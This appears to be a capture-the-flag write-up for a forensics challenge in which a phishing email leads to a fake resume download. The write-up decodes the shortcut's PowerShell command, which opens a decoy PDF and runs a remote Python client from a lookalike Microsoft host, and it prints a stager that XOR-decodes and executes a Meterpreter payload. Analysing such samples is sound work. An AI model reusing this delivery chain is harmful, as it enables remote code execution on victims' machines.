# A new Hire 
### The Royal Archives of Eldoria have recovered a mysterious document—an old resume once belonging to Lord Malakar before his fall from grace. At first glance, it appears to be an ordinary record of his achievements as a noble knight, but hidden within the text are secrets that reveal his descent into darkness.

First, the challenge welcomes us with an .eml file, so an email. We then open it to see its contents :

![mail](https://github.com/user-attachments/assets/5a98887e-2016-47fd-9278-ea2060108038)

We then go to the link provided by the challenge after making a small modification to `/etc/hosts` and entering the port provided by the challenge.
We then arrive at an index.php file, which prompts us to click a button to reveal the CV :

![index php](https://github.com/user-attachments/assets/2e5a353f-aa1d-4f3f-84c3-cc4508fa220d)

This button, which is supposed to unlock our access to the CV, actually downloads this :

![remuse pdf](https://github.com/user-attachments/assets/36f27514-808b-4cf9-89c7-dedbb8d668e6)

So I wonder, what is this shortcut doing ?

![raccourci](https://github.com/user-attachments/assets/42e35513-8fde-402a-b699-ae8e0fd6fdbe)

Once decoded from base64, we get this :
```powershell 
[System.Diagnostics.Process]::Start('msedge', 'http://storage.microsoftcloudservices.com:41075/3fe1690d955e8fd2a0b282501570e1f4/resumesS/resume_official.pdf');  \\storage.microsoftcloudservices.com@41075\3fe1690d955e8fd2a0b282501570e1f4\python312\python.exe \\storage.microsoftcloudservices.com@41075\3fe1690d955e8fd2a0b282501570e1f4\configs\client.py
```
So we go to the URL `http://storage.microsoftcloudservices.com:41075/3fe1690d955e8fd2a0b282501570e1f4/configs/client.py`, which lets us download another little gift :
```python
key=base64.decode("SFRCezRQVF8yOF80bmRfbTFjcjBzMGZ0X3MzNHJjaD0xbjF0MTRsXzRjYzNzISF9Cg==")

data = base64.b64decode("c97FeXRj6jeG5P74ANItMBN […] ")
meterpreter_data = bytes([data[i] ^ key[i % len(key)] for i in range(len(data))])

exec(__import__('zlib').decompress(meterpreter_data)[0])
```
Which leads us to this :
```python
import base64
print(base64.b64decode("SFRCezRQVF8yOF80bmRfbTFjcjBzMGZ0X3MzNHJjaD0xbjF0MTRsXzRjYzNzISF9Cg=="))
```
Bingo! Let's make it readable again :

![flag2](https://github.com/user-attachments/assets/9fe23c1a-e189-40e2-841f-21a5ef59b4b5)

And there you have it !
